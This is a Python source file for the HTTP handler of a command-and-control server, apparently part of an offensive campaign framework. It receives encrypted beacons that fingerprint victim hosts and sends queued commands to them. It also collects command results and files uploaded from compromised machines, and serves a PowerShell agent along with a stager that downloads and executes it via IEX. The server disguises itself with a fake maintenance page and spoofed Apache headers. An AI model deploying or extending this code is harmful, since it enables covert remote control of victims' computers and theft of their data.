import http.server
import json
import base64
import os
import time
from core.utils.client_identity import extract_system_info

class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
    """
    Custom HTTP request handler for C2 communications
    Handles client check-ins, commands, and file transfers with encryption
    Supports customizable URL paths to evade detection
    """
    
    def __init__(self, request, client_address, server, client_manager, logger, crypto_manager, campaign_name, url_paths=None):
        self.client_manager = client_manager
        self.logger = logger
        self.crypto_manager = crypto_manager
        self.campaign_name = campaign_name
        
        # Set default URL paths
        self.url_paths = {
            "beacon_path": "/beacon",
            "agent_path": "/raw_agent",
            "stager_path": "/b64_stager",
            "cmd_result_path": "/command_result",
            "file_upload_path": "/file_upload"
        }
        
        # Update with custom paths if provided
        if url_paths:
            self.url_paths.update(url_paths)
            
        # Make sure all paths start with '/'
        for key, path in self.url_paths.items():
            if not path.startswith('/'):
                self.url_paths[key] = '/' + path
                
        super().__init__(request, client_address, server)

    def log_message(self, format, *args):
        self.logger(f"{self.client_address[0]} - - [{self.log_date_time_string()}] {format % args}")

    def do_GET(self):
        # Log the request details
        self.log_message(f"Received GET request for {self.path}")

        # Route requests to appropriate handlers based on custom paths
        if self.path == self.url_paths["agent_path"]:
            self.send_agent_response()
        elif self.path == self.url_paths["stager_path"]:
            self.send_b64_stager_response()
        elif self.path == self.url_paths["beacon_path"]:
            self.handle_beacon()
        else:
            # Default response for unmatched paths - provide a generic 200 response
            # This helps make the server look like a legitimate web server
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            
            # Return a generic-looking webpage to further avoid detection
            message = """
            <!DOCTYPE html>
            <html>
            <head>
                <title>Website</title>
                <meta name="viewport" content="width=device-width, initial-scale=1">
                <style>
                    body { font-family: Arial, sans-serif; margin: 0; padding: 20px; }
                    .container { max-width: 800px; margin: 0 auto; }
                    h1 { color: #333; }
                </style>
            </head>
            <body>
                <div class="container">
                    <h1>Welcome</h1>
                    <p>This page is currently under maintenance. Please check back later.</p>
                </div>
            </body>
            </html>
            """
            self.wfile.write(message.encode("utf-8"))
    
    def handle_beacon(self):
        """Process check-in requests from clients"""
        ip = self.client_address[0]
        self.logger(f"Beacon received from {ip}")
        
        # Check for system information in headers
        system_info_encrypted = self.headers.get('X-System-Info')
        
        # Extract possible client identifier from headers
        client_identifier = self.headers.get('X-Client-ID')
        
        if system_info_encrypted:
            try:
                # Decrypt the system information
                system_info_json = self.crypto_manager.decrypt(system_info_encrypted)
                
                # Extract key system properties
                hostname, username, machine_guid, os_version, mac_address, system_info = extract_system_info(system_info_json)
                
                # Add IP to system info
                system_info['ip'] = ip
                
                # Add unique client identifier if provided
                if client_identifier:
                    system_info['client_identifier'] = client_identifier
                
                # Register the client with enhanced information
                client_id = self.client_manager.add_client(
                    ip=ip,
                    hostname=hostname,
                    username=username,
                    machine_guid=machine_guid,
                    os_version=os_version,
                    mac_address=mac_address,
                    system_info=system_info
                )
                
                # Verify client identity if verifier is available
                if hasattr(self.server, 'client_verifier') and self.server.client_verifier:
                    verifier = self.server.client_verifier
                    is_verified, confidence, warnings = verifier.verify_client(client_id, system_info)
                    
                    # Update client verification status
                    self.client_manager.set_verification_status(client_id, is_verified, confidence, warnings)
                    
                    if not is_verified:
                        warning_str = ", ".join(warnings)
                        self.logger(f"WARNING: Client {client_id} identity suspicious (confidence: {confidence:.1f}%): {warning_str}")
                    
                    # Register/update this client information for future reference
                    verifier.register_client(client_id, system_info)
                
                self.logger(f"Client identified as {client_id} ({hostname}/{username})")
            except Exception as e:
                self.logger(f"Error processing system information: {str(e)}")
                # Fall back to IP-based identification
                client_id = ip
                self.client_manager.add_client(client_id)
        else:
            # Fall back to IP-based identification for compatibility
            client_id = ip
            self.client_manager.add_client(client_id)
        
        # Process commands to send to client
        commands = self.client_manager.get_pending_commands(client_id)
        self.logger(f"Commands to send to client {client_id}: {commands}")
        
        # Log the command sent to the client
        for command in commands:
            self.client_manager.log_event(client_id, "Command send", f"Type: {command['command_type']}, Args: {command['args']}")
        
        # Encrypt commands json before sending
        commands_json = json.dumps(commands)
        encrypted_commands = self.crypto_manager.encrypt(commands_json)
        
        # Send encrypted data
        self.send_response(200)
        self.send_header("Content-type", "application/json")
        self.end_headers()
        self.wfile.write(encrypted_commands.encode("utf-8"))
        self.client_manager.clear_pending_commands(client_id)

    def _get_campaign_name(self):
        """Helper method to get the active campaign name"""
        # Use the campaign name provided during initialization if available
        if self.campaign_name:
            return self.campaign_name
            
        # Otherwise, try to find campaign directories
        campaign_dirs = [d for d in os.listdir() if d.endswith("_campaign") and os.path.isdir(d)]
        if not campaign_dirs:
            return None
        # For now, just use the first campaign found
        return campaign_dirs[0][:-9]  # Remove "_campaign" suffix
    
    def send_agent_response(self):
        """Send the PowerShell agent code"""
        from core.utils.agent_generator import generate_agent_code
        
        # Get the key as base64
        key_base64 = self.crypto_manager.get_key_base64()
        server_address = f"{self.server.server_address[0]}:{self.server.server_address[1]}"
        
        # Generate the agent code with custom URL paths
        agent_code = generate_agent_code(
            key_base64, 
            server_address, 
            beacon_path=self.url_paths["beacon_path"],
            cmd_result_path=self.url_paths["cmd_result_path"],
            file_upload_path=self.url_paths["file_upload_path"]
        )

        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        # Add some legitimate-looking headers to blend in with normal web traffic
        self.send_header("Cache-Control", "max-age=3600, must-revalidate")
        self.send_header("Server", "Apache/2.4.41 (Ubuntu)")
        self.end_headers()
        self.wfile.write(agent_code.encode("utf-8"))

    def send_b64_stager_response(self):
        """Send a Base64 encoded stager that will download and execute the agent"""
        # Use the custom agent path
        agent_path = self.url_paths["agent_path"]
        stager_code = f"$V=new-object net.webclient;$S=$V.DownloadString('http://{self.server.server_address[0]}:{self.server.server_address[1]}{agent_path}');IEX($S)"
        
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        # Add some legitimate-looking headers to blend in with normal web traffic
        self.send_header("Cache-Control", "max-age=3600, must-revalidate")
        self.send_header("Server", "Apache/2.4.41 (Ubuntu)")
        self.end_headers()
        self.wfile.write(stager_code.encode("utf-8"))

    def do_POST(self):
        """Handle POST requests for command results and file uploads"""
        # Log the request details
        self.log_message(f"Received POST request for {self.path}")

        if self.path == self.url_paths["cmd_result_path"]:
            self.handle_command_result()
        elif self.path == self.url_paths["file_upload_path"]:
            self.handle_file_upload()
        else:
            # Return a generic 404 or 200 response to avoid detection
            self.send_response(200)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"OK")

    def handle_command_result(self):
        """Process command results sent from clients"""
        ip = self.client_address[0]
        content_length = int(self.headers['Content-Length'])
        encrypted_data = self.rfile.read(content_length).decode('utf-8')
        
        # Extract possible client identifier from headers
        client_identifier = self.headers.get('X-Client-ID')
        if client_identifier:
            # If we have a client identifier header, use it for logging
            self.logger(f"Result received from client ID {client_identifier} (IP: {ip})")
        
        # Decrypt the result
        try:
            result_data = self.crypto_manager.decrypt(encrypted_data)
            
            # Try to parse the result as JSON
            try:
                result_json = json.loads(result_data)
                if isinstance(result_json, dict) and 'timestamp' in result_json and 'result' in result_json:
                    # This is a structured result with timestamp
                    timestamp = result_json['timestamp']
                    result = result_json['result']
                    
                    # Find the client by either client_id or IP
                    client_found = False
                    for client_id, client_info in self.client_manager.get_clients_info().items():
                        # Check if this client has the matching client_identifier
                        if client_identifier and client_info.get('system_info', {}).get('client_identifier') == client_identifier:
                            self.client_manager.add_command_result(client_id, timestamp, result)
                            self.logger(f"Result processed for client {client_id} (timestamp: {timestamp})")
                            client_found = True
                            break
                        # Fallback to IP if no client_identifier match
                        if client_info.get('ip') == ip:
                            self.client_manager.add_command_result(client_id, timestamp, result)
                            self.logger(f"Result processed for client {client_id} by IP match (timestamp: {timestamp})")
                            client_found = True
                            break
                    
                    if not client_found:
                        # If no client was found, log as a generic result
                        self.logger(f"Result received from unknown client {ip}: {result_data}")
                        self.client_manager.log_event("Unknown", "Command Result Received", f"{result_data}")
                else:
                    # Unstructured result, log as is
                    self.logger(f"Result received from {ip}: {result_data}")
                    
                    # Try to find client by IP
                    for client_id, client_info in self.client_manager.get_clients_info().items():
                        if client_info.get('ip') == ip:
                            self.client_manager.log_event(client_id, "Command Result Received", f"{result_data}")
                            break
                    else:
                        self.client_manager.log_event("Unknown", "Command Result Received", f"{result_data}")
            except json.JSONDecodeError:
                # Not JSON, treat as plain text result
                self.logger(f"Result received from {ip}: {result_data}")
                
                # Try to find client by IP
                for client_id, client_info in self.client_manager.get_clients_info().items():
                    if client_info.get('ip') == ip:
                        self.client_manager.log_event(client_id, "Command Result Received", f"{result_data}")
                        break
                else:
                    self.client_manager.log_event("Unknown", "Command Result Received", f"{result_data}")
            
            self.send_response(200)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"OK")  # Simple response to look more generic
        except Exception as e:
            self.logger(f"Error decrypting result from {ip}: {str(e)}")
            self.send_response(400)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"Bad Request")  # Generic error message

    def handle_file_upload(self):
        """Process file uploads from clients"""
        ip = self.client_address[0]
        content_length = int(self.headers['Content-Length'])
        encrypted_data = self.rfile.read(content_length).decode('utf-8')
        
        try:
            # Decrypt the file data
            file_content = self.crypto_manager.decrypt(encrypted_data)
            
            # Extract client identifier from headers if present
            client_identifier = self.headers.get('X-Client-ID')
            
            # Create uploads directory if it doesn't exist
            campaign_name = self._get_campaign_name()
            if not campaign_name:
                self.send_error(500, "Campaign not found")
                return
                
            campaign_folder = campaign_name + "_campaign"
            
            # Try to determine client ID from the identifier or IP
            client_id = None
            if client_identifier:
                for cid, client_info in self.client_manager.get_clients_info().items():
                    if client_info.get('system_info', {}).get('client_identifier') == client_identifier:
                        client_id = cid
                        break
            
            if not client_id:
                # Try to find by IP
                for cid, client_info in self.client_manager.get_clients_info().items():
                    if client_info.get('ip') == ip:
                        client_id = cid
                        break
            
            # Fallback to IP if no client ID found
            uploads_folder = os.path.join(campaign_folder, "uploads", client_id or ip)
            os.makedirs(uploads_folder, exist_ok=True)
            
            # Try to parse as JSON (might be a file info structure)
            try:
                file_info = json.loads(file_content)
                if isinstance(file_info, dict) and 'FileName' in file_info and 'FileContent' in file_info:
                    # This is a structured file upload
                    file_name = file_info['FileName']
                    file_content_base64 = file_info['FileContent']
                    file_content_bytes = base64.b64decode(file_content_base64)
                    
                    file_path = os.path.join(uploads_folder, file_name)
                    with open(file_path, 'wb') as f:
                        f.write(file_content_bytes)
                    
                    self.logger(f"File uploaded from {client_id or ip}: {file_name} ({len(file_content_bytes)} bytes)")
                    if client_id:
                        self.client_manager.log_event(client_id, "File Upload", f"File saved to {file_path}")
                else:
                    # Not a structured file upload, save as raw text
                    timestamp = time.strftime("%Y%m%d-%H%M%S")
                    file_path = os.path.join(uploads_folder, f"upload_{timestamp}.txt")
                    
                    with open(file_path, 'w') as f:
                        f.write(file_content)
                        
                    self.logger(f"Raw text uploaded from {client_id or ip} and saved to {file_path}")
                    if client_id:
                        self.client_manager.log_event(client_id, "File Upload", f"Raw text saved to {file_path}")
            except json.JSONDecodeError:
                # Not JSON, save as raw text
                timestamp = time.strftime("%Y%m%d-%H%M%S")
                file_path = os.path.join(uploads_folder, f"upload_{timestamp}.txt")
                
                with open(file_path, 'w') as f:
                    f.write(file_content)
                    
                self.logger(f"Raw text uploaded from {client_id or ip} and saved to {file_path}")
                if client_id:
                    self.client_manager.log_event(client_id, "File Upload", f"Raw text saved to {file_path}")
            
            self.send_response(200)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"OK")  # Simple response to look more generic
            
        except Exception as e:
            self.logger(f"Error handling file upload from {ip}: {str(e)}")
            self.send_response(500)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"Server Error")  # Generic error message